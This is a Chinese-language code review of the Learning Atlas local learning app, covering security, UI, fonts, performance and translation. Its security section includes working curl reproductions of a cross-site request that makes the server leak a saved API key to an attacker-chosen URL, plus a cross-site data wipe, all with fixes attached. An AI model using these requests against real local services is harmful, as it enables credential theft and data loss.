# Learning Atlas 全面 Review（v0.26.9，2026-10-23）

审查范围：`apps/local-learning`（前端、服务端、测试）、`content/`（译文、测验、理论卡）、`scripts/`、`.github/workflows/`、根目录文档与设计规范。没有修改任何已有文件；新增文件都在 `review/` 下。

- `review/REVIEW.md`：本报告
- `review/reader-prototype.html`：课程阅读页改进示例（单文件，直接用浏览器打开）
- `review/screenshots/`：`01–07` 是现有应用的截图，`p01–p09` 是示例页的截图

## 0. 先看结论

整体基础扎实：来源指纹、人工审核门禁、待同步降级、本地 SQLite、导出导入这些机制都设计得很认真，四个校验脚本和 26 个 API 测试全部通过。问题主要集中在下面几处：

1. **安全（需要先修）**：本地服务不校验 `Origin`/`Host`。任何网页都能让浏览器向 `127.0.0.1:4173` 发请求，**把已保存的 API key 发到攻击者的地址**，或者**清空全部学习数据**。两者我都实际复现了。
2. **阅读器交互**：每次点按钮都整页 `innerHTML` 重绘，所以切换面板会丢失笔记草稿、测验选项和已展开的理论卡；浏览器后退键会直接回到首页；没有上一课/下一课。
3. **中文字体实际不存在**：`AtlasSansSC.woff2` 只有 73 个字形，没有一个汉字，中文全部回退到系统字体。
4. **内容**：38 节已标为 `reviewed` 的课程含有未翻译的英文练习提示，而且 Markdown 渲染器会把它渲染成三个破碎的引用块，中间夹着字面的 `>`。
5. **性能**：`/api/course` 和 `/api/curriculum` 每次约 3.5 秒，打开一节课约 4.4 秒；保存一条笔记之后也要再等一次 `/api/course`。

严重度说明：**P0** 应在下次发布前修复；**P1** 影响多数学习者的体验；**P2** 影响局部或属于维护成本；**P3** 是建议。

## 1. 验证记录

| 检查 | 结果 |
| --- | --- |
| `check_translation_correspondence.py` | PASS |
| `check_source_fingerprints.py` | PASS（1532 条） |
| `check_theory_cards.py` | PASS（289 张） |
| `check_repository_hygiene.py` | PASS |
| `check_translation_coverage.py` | 14 节 Phase 13 课程缺译文（与 README 一致） |
| `python3 -m unittest discover -s scripts -p 'test_*.py'`（CI 写法） | 7 个测试通过 |
| `npm run check` | 通过 |
| `npm test` | 26/26 通过，耗时 69 秒 |
| Playwright 实测（1440 / 1024 / 375，浅色和深色） | 见各节标注“实测” |

服务端用临时数据目录 `/tmp/la-review-data` 启动，没有碰你的 `apps/local-learning/data/`。

## 2. 安全

### S1（P0）跨站请求可以窃取已保存的 API key — 实测

`POST /api/model-config/models` 接受请求体里的 `baseUrl`，如果请求里没有带 `apiKey`，就用数据库里保存的 key（`server.ts` 约 1490 行）。服务端不检查 `Origin`，也不要求 `content-type: application/json`，所以浏览器把它当作“简单请求”直接发出，不需要 CORS 预检。

复现：

```bash
# 学习者已保存自己的 key
curl -X PUT http://127.0.0.1:4173/api/model-config -H 'content-type: application/json' \
  -d '{"baseUrl":"https://api.example-provider.com/v1","model":"m","apiKey":"sk-SECRET-FAKE-123"}'
# 任意网页都能发出的请求（text/plain，不触发预检）
curl -X POST http://127.0.0.1:4173/api/model-config/models \
  -H 'Origin: https://evil.example' -H 'content-type: text/plain' -d '{"baseUrl":"http://127.0.0.1:19873"}'
```

监听端收到：`LEAKED /models Authorization= Bearer sk-SECRET-FAKE-123`。

攻击者网页虽然读不到响应，但 key 已经通过服务端发到了攻击者的服务器。

### S2（P0）跨站请求可以清空全部学习数据 — 实测

`POST /api/import` 同样接受 `text/plain`。从 `https://evil.example` 发一个空备份，返回 `{"restored":{"learningStates":0,...}}`，进度、笔记、对话、复习项全部被替换。同理，`PUT /api/learning-state`、`DELETE /api/tutor/messages`、`POST /api/workspace/open`（会在本机启动 VS Code）都能被跨站触发。

### S3（P1）没有校验 Host，可被 DNS rebinding 读取数据 — 实测

带 `Host: evil.example:4173` 请求 `/api/export?format=json` 返回 200。攻击者把自己的域名解析到 127.0.0.1 之后，就能以同源身份读取导出的全部笔记和对话。

**S1–S3 的修复方法**（改动集中在 `handler` 入口，约 20 行）：

- 只接受 `Host` 为 `127.0.0.1:4173` 或 `localhost:4173` 的请求，其他返回 421。
- 所有非 GET 请求：要求 `Origin` 与上面一致（或者没有 Origin 头），并且要求 `content-type: application/json`，否则返回 403/415。
- `/api/model-config/models` 只要请求体里的 `baseUrl` 与已保存的不同，就**不使用已保存的 key**。
- 补三个测试：跨源 POST 返回 403、`text/plain` 返回 415、换了 baseUrl 不会带上已存的 key。

### S4（P2）其他安全细节

- 没有 `Content-Security-Policy`、`X-Content-Type-Options: nosniff`、`Referrer-Policy`。阅读器全部是本地资源，`default-src 'self'` 加上 `img-src 'self' data:`、`style-src 'self' 'unsafe-inline'`（Mermaid 需要）就够用；`index.html` 里的内联主题脚本可以改成外部文件，或者加 hash。
- `app.js` 的 `render()` 把 `lesson.title`、`lesson.phase`、`lesson.originalTitle`、`lesson.duration` 直接插进 HTML，没有转义。这些值来自仓库内容，风险低，但其他地方都转义了，这里应该统一。
- 请求体不是合法 JSON 时返回 500，错误信息是原样的 `Unexpected token 'o'...`，应改为 400。
- API key 以明文存在 SQLite。本地优先的产品可以接受，但 `first-use.md` 应该明确写出来，并提醒不要把 `data/` 同步到网盘。

## 3. 前端：课程阅读页（`app.js`）

### F1（P1）每次交互都整页重绘，学习者的输入会丢失 — 实测

`render()` 每次都重写整个 `#app` 的 `innerHTML`。打开或关闭面板、切换主题、保存笔记、提交测验、标记理解都会调用它。实测（Phase 2 第 1 课）：展开理论卡、选好一个测验选项、在笔记框里写一段草稿，然后从“笔记”切到“学习助理”再切回来：

```json
{ "theoryCardStillOpen": false, "quizSelectionKept": false, "noteDraft": "" }
```

附带问题：Mermaid 图每次重新生成；`IntersectionObserver` 重新绑定；`course-reader.md` 要求的“面板开关时保留阅读位置”只能靠滚动恢复来勉强实现。

修复方向：静态外壳只渲染一次，面板用 `hidden` 属性切换；切换课程时只替换 `<main>`；计数、按钮状态这类小更新直接改对应元素。示例页就是这样做的，不需要引入框架。

### F2（P1）浏览器后退键会离开阅读器 — 实测

`loadLesson()` 用的是 `history.replaceState`。从 A 课点进 B 课之后按后退，地址变成 `http://127.0.0.1:4173/`，A 课的记录没有了。应改为 `pushState`，并监听 `popstate`。

### F3（P1）没有上一课/下一课

`design-system/learning-atlas/pages/course-reader.md` 明确要求阅读栏末尾有“lesson navigation”。现在读完一课只能回到左侧目录去找下一课，移动端还要先打开抽屉。

### F4（P1）界面文案写死在第一版的数学课上 — 实测

`render()` 只区分“Phase 0”和“其他”，其他所有阶段都用数学课的文案。在 Phase 2《什么是机器学习》里实测：

- 导语：“把本课的**数学直觉**转化为可运行的 Python 实现。”
- 笔记占位：“例如：**向量为什么能表示一个词？**”
- 助理占位：“为什么这两个方向越接近，**点积**通常越大？”
- 复习占位：“我需要重新判断**点积**的正负……”
- 测验说明：“**这三题**来自锁定版本的课程测验”，实际有 5 题。全部 293 份测验都是 5–8 题，没有一份是 3 题。

建议：导语改用译文开头的引语（每课都有 `> …`），占位文字用中性措辞，题数用 `quiz.questions.length` 计算。

### F5（P1）测验的 `stage` 字段没有被使用

所有测验题都有 `stage`：`pre` 481 题、`check` 513 题、`post` 743 题。阅读器把它们全部放在课程末尾一次性作答。“读前预测”的教学价值在于先暴露直觉、读完再对照，现在这部分设计没有发挥作用。示例页演示了一种做法：`pre` 题放在正文前、不计分，读完后在自测里揭晓并对比“你读前选了什么”。

另外两个小问题：

- 漏答时提示来自浏览器原生的 `required` 气泡，看不出还差哪几题。
- 答错后只有一个“在待复习中确认”按钮，点了之后打开空白表单，还要自己重写一遍。应该直接把题目加入复习，并给出“回看相关段落”的链接。

### F6（P2）目录标签只有竖条，看不出是哪一节 — 实测

宽屏下右侧是 15 个没有文字的竖条，悬停才展开标题；正文和左侧导航之间留了 330px 的空白（`.shell` 第二列固定 12rem，但这一列什么都不放）。建议改成带文字的右侧目录，并显示阅读进度。

### F7（P2）可访问性与移动端 — 实测

- 屏幕宽度 ≤900px 时主题选择被 `display: none` 隐藏（实测 375px 下 `display` 为 `none`），手机上无法切换主题。
- 移动端课程目录抽屉按 Esc 关不掉（实测打开后按 Esc，`navigator-open` 仍为 true），也没有焦点限制，Tab 会跑到背后的正文。
- `≤900px` 的底部面板没有 `role="dialog"`，也没有 inert 背景；只有 901–1104px 区间做了焦点陷阱。
- 只靠颜色区分课程状态（未开始/学习中/已理解/需复习）。`MASTER.md` 写明“Never communicate a state through colour alone”。现在有文字标签，但小屏下标签很小，建议同时加上形状不同的图标。
- 清空对话和导入备份用 `window.confirm`，出错用 `window.alert`。`course-reader.md` 要求“disclosure rather than modal interruption”；改成行内确认加“撤销”提示更合适。
- 外链（`target="_blank"`）没有“在新窗口打开”的提示。

### F8（P2）其他

- `/learn` 默认打开 Phase 0 第 1 课，服务端 `defaultLessonId` 是 Phase 1 第 1 课，两边不一致。
- 理论阅读器顶部的“实践主线”链接总是指向 `/learn`，学习者会从 Phase 0 第一课重新开始，而不是回到上次的位置。首页已经有 `curriculum.target`，可以复用。
- `request()` 假定响应一定是 JSON；服务端返回 HTML 或空响应时，用户看到的是 `Unexpected token '<'`。
- `/api/tools` 每次打开课程都会调用，但返回值没有被前端使用（见 P2 性能部分）。
- 主题逻辑在 `theme.js` 和 `app.js` 各写了一份，阅读器没有用 `theme.js`。

## 4. 前端：Markdown 渲染（`markdown.js`）

自写的解析器覆盖了大部分内容，但下面几种写法在语料里真实存在，并且渲染错误：

| 写法 | 语料中的数量 | 现在的渲染 |
| --- | --- | --- |
| 多行引用中的空行 `>` | 39 个文件，147 行 | 拆成多个 `<blockquote>`，中间出现字面的 `>`（截图 06） |
| 分隔线 `---` | 6 个文件，28 处 | 显示为字面的 `---` |
| 以 `3.` 开头的有序列表 | — | 编号从 1 重新开始（`start` 丢失） |
| 正文里的美元金额，如 `$5 到 $10` | — | 被当成行内公式 |
| 缩进代码块、HTML 块 | — | 不支持 |

建议：要么换成 `marked`（已经在 `node_modules` 里，是 Mermaid 的依赖）加 DOMPurify，再在其上挂 learning-atlas 的锚点和理论卡；要么至少补上多行引用、分隔线、`start` 三项，并为 `markdown.js` 写单元测试，用语料里的真实片段做夹具。

### 深色模式下图片是刺眼的白底 — 实测

`.markdown-figure { background: #fffefa; }` 写死了浅色。深色主题下实测背景是 `rgb(255, 254, 250)`（截图 03）。上游图大多是透明底 SVG/PNG，应该改用主题变量；少数确实需要白底的图片可以单独加一个类名。

## 5. 视觉与设计系统

### D1（P1）中文字体文件里没有中文 — 实测

```
AtlasSansSC.woff2: 73 glyphs; CJK: 0
字符集: ' "\'(),-./012589:<=>@ABC…XY[]_abc…xyz'
name 表: Noto Sans CJK SC
```

这个文件是 Noto Sans CJK SC 的一个子集，但子集里只有拉丁字母、部分标点和数字 `0 1 2 5 8 9`，**没有 3、4、6、7，没有 Q、Z，没有汉字**。后果：

- 所有中文都回退到 `system-ui`，在 Windows、macOS、Linux 上看起来各不一样。
- 同一个数字串会混用两种字体，例如 “1**3** / 1**3**” 中 1 来自 Noto，3 来自系统字体。
- 正文 `.markdown-content` 用的是 `"Source Serif 4", "Atlas Sans SC"`：拉丁字母是衬线体，汉字是无衬线体，一句话里出现两种风格（截图 07）。

建议二选一：

1. 不随包分发中文字体，直接用系统字体栈：`"PingFang SC", "Noto Sans SC", "Microsoft YaHei", system-ui`。体积为零，各平台都清晰。
2. 按语料实际用到的字符重新子集化（约 3500–6000 字，woff2 大约 1–2 MB），并用 `unicode-range` 拆分。

正文是衬线还是无衬线需要选定一种。中文长文阅读通常用无衬线；如果想要衬线，就配一套中文衬线（如 Noto Serif SC），不要让两种风格混在一个段落里。

### D2（P2）设计规范与实现不一致

- `MASTER.md`：Review cue 是 `#B6463D`；`styles.css` 是 `#9c4438`。
- `MASTER.md` 要求 primitive → semantic → component 三层 token；实际只有一层，而且 `styles.css` 里有 `!important` 和写死的颜色（`.hero-visual img { background: #fffefa }`、Mermaid 主题色、`.hljs-*` 颜色）。
- `MASTER.md` 说“Avoid … gradients used as decoration”，`.notice` 和 `body` 用了装饰性渐变。
- 首页的 GSAP 滚动动画、跑马灯和 `pin` 与“quiet, paper-like editorial interface”的方向有些冲突。跑马灯把内容复制了一份，读屏软件会读两遍，应给副本加 `aria-hidden="true"`。
- 首页 resize 事件里直接调用 `initMotion()`，没有防抖。

### D3（P3）首页文案

- “20 个 Phase”“Phase 0-18 可进入学习”“20 章”写死在 `home.js`，不随 `curriculum.summary` 变化。
- `chapterIndex === 3` 默认展开第 4 章，没有说明原因。
- 面向学习者的界面里出现了维护者用语：“English main”“本轮”“审核快照 <40 位 SHA>”“扩展内容待迁移”。建议改成“英文原文”“当前版本”“审核版本 f7aadc1”，完整 SHA 放在 `title` 或页脚。

## 6. 服务端、性能与数据

### P1（P1）课程目录接口每次约 3.5 秒 — 实测

| 接口 | 耗时 |
| --- | --- |
| `/api/curriculum`（首页） | 3.49 s |
| `/api/course`（阅读器目录） | 3.52 s |
| `/api/tools` | 2.48 s |
| 打开一节课（前端并发 12 个请求） | 4.42 s |
| `/api/health` | 0.014 s |

原因：

- `courseOutline()` 对 443 节课逐一调用 `lessonFor()` 和 `publishedLessonContent()`。每次都要 `readdirSync` 整个阶段目录、读取译文和英文原文、计算 SHA-256，还要读取全部理论关联 YAML 并对理论原文再算一遍哈希。
- 保存笔记、标记理解、提交测验之后，前端都会再请求一次 `/api/course`，所以每个操作之后都要再等 3.5 秒左右。
- `handler()` 一开始就执行 `lessonFor(lessonId)`，连静态文件请求也会扫描一次目录。

修复：启动时建一次课程索引（id、标题、状态、指纹结果），按文件 `mtime` 失效；学习进度单独用一条 `SELECT lesson_id, completed, review … FROM learning_state` 查出来。这样 `/api/course` 预计可以降到 10 ms 以内。`npm test` 的 69 秒大部分也是这个原因。

### P2（P2）`/api/tools` 阻塞事件循环

`commandAvailable()` 用 `spawnSync("code", ["--version"])`，在执行期间整个服务器停止响应其他请求，这就是上表里其他请求被拖到约 1 秒的原因。前端只是 `await` 了这个结果，并没有使用它。可以删除这个调用，或者在启动时检测一次并缓存。

### P3（P2）数据与链接

- **“查看锁定版本的原始课程”指向你的 fork**：`sourceUrl()` 把 `ai-engineering-from-scratch` 映射到 `github.com/huangyue12120/...`，而 `.gitmodules`、README 和许可证说明里的上游都是 `rohitg00`。如果 fork 不再同步，固定 revision 的链接会 404。理论链接已经指向官方仓库，实践链接也应如此。
- **导入备份很脆弱**：只要备份里有一个 `lessonId` 不在当前目录中（例如上游删除或改名了一节课），整个导入就会失败。建议跳过并报告这些条目，或者原样保留。另外每一行都要调用一次 `lessonFor()`，大备份会很慢。
- **上游新增的课程在目录中消失**：`lessonSlugs()` 只列出已有中文译文的目录，所以 Phase 13 新增的 14 节课程在阅读器目录里完全看不到，课程序号也只按已翻译的课计算（显示为“31 节”，而上游有 45 节）。首页卡片却用 `practicePhaseLessonCount()` 统计全部课程。建议目录里列出这些课程并标注“待中文适配”，就像 Phase 19 那样。
- 测验校验要求“正好 4 个选项”，选项数量是上游决定的，写成 2–6 更稳妥。
- 学习助理把整节课的 Markdown 放进系统提示词，30 秒超时，不支持流式输出。长课程配合本地小模型很容易超时。可以考虑只发送当前章节及其前后各一节，并改为流式返回。
- 错误信息中英文混杂，例如 `"note text must contain 1–2000 characters"` 和 `"课程不存在。"`。这些信息会直接显示给学习者，应统一为中文。
- 运行时会打印 `ExperimentalWarning: SQLite is an experimental feature`。Node 22.18 下 `node:sqlite` 仍是实验特性，应在 README 中说明，或在 `dev` 脚本里加 `--no-warnings=ExperimentalWarning`。

### P4（P3）测试

- 没有任何前端测试。`markdown.js` 和 `theory-card.js` 都是纯函数，很容易测，而第 4 节列出的渲染问题正好都可以用测试捕捉到。
- 没有安全回归测试（见 S1–S3 的修复建议）。
- 建议用 Playwright 写几条冒烟测试：打开课程、切换面板时草稿保留、后退回到上一课、375px 下没有横向滚动。

## 7. 翻译与内容

### C1（P1）已审核课程里有未翻译的英文 — 实测

38 个文件（共 39 处）标为 `status: reviewed`，但含有上游新增、未翻译的练习提示：

```
## 练习
### 提示
> 上游新增练习提示（原文，待中文复核）：
>
> **Exercise 1.** Run `python3 phases/00-setup-and-tooling/...` ...
```

问题有三层：

1. **流程**：`reviewed` 的含义变得模糊。阅读器显示“译文：已审核”，而这一节其实有一段英文没有审核。建议引入部分状态（例如 `reviewed-with-pending`），或者在 `check_translation_correspondence.py` 中，把“待中文复核”标记视为未通过（或至少给出警告）。
2. **位置**：英文提示放在中文练习列表**之前**，学习者先读到英文，后读到中文。应该放在后面，并默认折叠。
3. **内容冲突**：`00-setup-and-tooling/01-dev-environment` 的 Exercise 3 要求用 TypeScript、Rust、Julia 各写一个程序，这与 ADR 0015 的“Python-first”定位冲突。中文练习第 3 条“用四种语言分别编写并运行一个 hello world”也是同样的问题。

### C2（P2）测验的正确答案大多是最长的选项

1737 道题里，有 1494 道（86%）的正确选项是四个选项中最长的。这个问题来自上游（上游 2362 道题中占 89%），但它会让学习者不读题也能猜对。正确答案的位置分布是均匀的（0/1/2/3 分别为 417/455/418/447），所以只需要处理选项长度。建议在改编时把干扰项写得同样具体，并在 `check_*` 脚本里加一个统计告警。

### C3（P3）术语

整体与术语表一致：“词元”2936 次、“智能体”2693 次、“提示词”1152 次。抽样发现的少数偏差：

- `19-capstone-projects/50-hypothesis-generator`：“研究**代理**……就是在浪费**令牌**”。按术语表应为“研究智能体”“浪费词元”。
- 术语表规定 agent 正文用“智能体”，但正文里裸写的 `Agent`/`agent` 仍有约 266 行（不含代码），其中一部分是产品名（如 Agent SDK、Agent Card），合理；另一部分是通用概念，如“模型或自主 agent”。
- Mermaid 图中的 subgraph 名称没有翻译，如 `01-math-foundations/01-linear-algebra-intuition` 的 `Before`/`After`。
- `11-llm-engineering/01-prompt-engineering` 的提示词示例保留了英文（109 行），没有中文对照。保留英文示例本身合理，但中文学习者可能更需要看到中文提示词的写法，可以考虑并列给出。

## 8. 仓库、CI 与文档

- **CI 的 Python 版本与项目不一致**：`pyproject.toml` 要求 `>=3.14`，`.python-version` 也是 3.14，CI 用的是 3.12。
- **`pyproject.toml` 是没整理过的 uv 脚手架**：`version = "0.2.0"`（应用是 0.26.9），`description = "Add your description here"`；依赖里有 `torch`、`transformers`、`intake-esgf` 等重型包，README 推荐的却是 `pip install marimo numpy matplotlib jax`。`uv sync` 会下载好几个 GB。建议改成可选依赖组，或者删除。
- **覆盖率报告写到仓库根目录**：`check_translation_coverage.py` 默认输出 `translation-coverage-report.md`，本地运行后会留下一个未跟踪的文件（现在根目录就有一个）。建议把默认输出改为 stdout 或 `.cache/`，并加入 `.gitignore`。
- **单独运行测试会失败**：`python3 -m unittest scripts/test_report_upstream_changes.py` 报 `ModuleNotFoundError`，只有 CI 的 `discover -s scripts` 写法能通过。可以在测试文件里加上 `sys.path` 设置，或者在 README 写明运行方式。
- `content-validation.yml` 里 `node --check public/app.js` 与 `npm run check` 重复。
- GitHub Actions 按 tag 固定（`@v4`），没有按 commit SHA 固定。`sync-upstreams-pr.yml` 有 `contents: write` 权限，建议按 SHA 固定，并配合 Dependabot 更新。
- **README 不适合新读者**：第三段是一个约 900 字的长段落，混着 commit SHA、Issue 编号和内部计数。“289 张理论卡”和“311 / 311 张理论卡”同时出现，读者很难理解两者的区别。建议 README 只保留“这是什么、怎么启动、当前开放范围”，版本细节放进 `release-notes.md`。
- `release-notes.md` 有 60 KB，包含全部历史版本；`translation-glossary.md` 有 116 KB。可以按版本或领域拆分。
- 根目录有 11 MB 的 `AI-Agents-in-Depth-zh-CN.pdf`，已被 `.gitignore` 忽略，但它与项目无关，放在别处更清楚。

## 9. HTML 示例页：`review/reader-prototype.html`

用浏览器直接打开即可，不依赖服务端和网络。示例页沿用现有色板、Source Serif 4 和 DM Mono，字体从 `apps/local-learning/public/fonts/` 相对引用。中文使用系统字体栈。数据存在浏览器 `localStorage`（键名 `la-proto`），不会碰 SQLite。

内置了 Phase 2 的 4 节课：第 1 课使用仓库中真实的已审核译文、理论卡和测验；第 2 课包含公式、代码和第二张理论卡；第 3 课演示“上游没有测验时不显示自测”；第 4 课演示“译文待同步”状态。目录里也演示了 Phase 13 的 14 节缺译文课程和 Phase 19 的待接入状态。

| 现有问题 | 示例页的做法 | 实测结果 |
| --- | --- | --- |
| F1 切换面板丢失状态 | 外壳只渲染一次，面板用 `hidden` 切换；草稿自动保存 | 切换后理论卡仍展开、读前选项保留、草稿“草稿：还没保存”保留 |
| F2 后退键离开阅读器 | hash 路由，每次切换课程都是一条真实的历史记录 | 进入下一课后按后退，回到《什么是机器学习》 |
| F3 没有翻页 | 末尾有上一课/下一课卡片，快捷键 `[` `]` | 按 `]` 进入《线性回归》 |
| F4 文案写死 | 导语、占位文字、题数都来自课程数据 | 显示“共 5 题，其中 2 题与读前预测相同” |
| F5 测验阶段 | `pre` 题放在正文前，不计分；自测里对照读前答案；逐题解释、回看链接、一键加入复习 | 漏答提示“还有 5 题未作答：第 1、2、3、4、5 题”；得分 3/5；加入复习后计数为 1 |
| F6 目录只有竖条 | 右侧带文字目录，高亮当前节，显示“已读 41%”；顶部有阅读进度条 | 截图 p01、p05 |
| F7 Esc、主题、焦点 | Esc 关闭抽屉和面板；所有宽度都显示主题按钮；遮挡正文时用 `inert` 和 `role="dialog"` | 375px 下 Esc 能关闭目录，主题按钮可见；1024px 下面板 `aria-modal=true`，正文 `inert` |
| F7 confirm/alert | 删除、清空、导入都改成行内确认，并提供“撤销”提示 | 截图 p04、p06 |
| 深色白底图 | 图示背景使用主题变量 | 深色模式下背景为 `rgb(31, 42, 38)` |
| C1 英文提示 | 放到中文练习之后，默认折叠，标注“英文原文 / 待中文复核”，并说明以 Python 为准 | 打开第 1 课“练习”一节即可看到 |
| P3 新增课程消失 | Phase 13 列出 14 节“待中文适配” | 目录可展开查看 |
| 状态只靠颜色 | 圆点形状不同（空心、半填充、实心、方形、虚线），并附文字和图例 | 截图 p01 左下 |

375px 下没有横向滚动，所有测试中控制台都没有报错。

示例页**没有**涉及首页和理论阅读器，也没有实现真实的模型调用：助理的回复是根据课程数据生成的演示文本，并标注“演示回复，未调用模型”。

## 10. 建议的处理顺序

1. **S1–S3**：在 `handler` 入口加 Host/Origin/content-type 校验，并让模型列表接口不再把已存的 key 发往新地址。改动小、风险高，建议单独发一个补丁版本。
2. **P1/P2**：建课程索引缓存，删除 `/api/tools` 调用。每次操作的等待时间会从秒级降到毫秒级。
3. **F1/F2/F3**：阅读器改为“外壳渲染一次、局部更新”，改用 `pushState`，加翻页。示例页可以作为参照。
4. **D1**：替换或重做中文字体子集，并选定正文字体风格。
5. **C1 + 第 4 节的 Markdown 问题**：修复多行引用和分隔线渲染；调整 38 节英文提示的位置与审核状态。
6. **F4/F5**：去掉写死的数学课文案，按 `stage` 分阶段展示测验。
7. 其余 P2/P3 项按维护节奏处理。

## 附：截图

- `01-home-1440.png`：现有首页
- `02-reader-1440.png`：现有阅读器（“这三题”与 5 道题）
- `03-theory-dark-1440.png`：深色模式下的白底图
- `04-reader-375.png`、`05-reader-375-nav.png`：现有移动端
- `06-english-hints.png`：英文提示被拆成多个引用块，中间夹着字面的 `>`
- `07-reader-top-1440.png`：无标签的目录竖条和 330px 空白
- `p01`–`p09`：示例页（1440 浅色、助理面板、自测结果、待同步、深色、1024 笔记面板、375 正文、目录抽屉、底部面板）
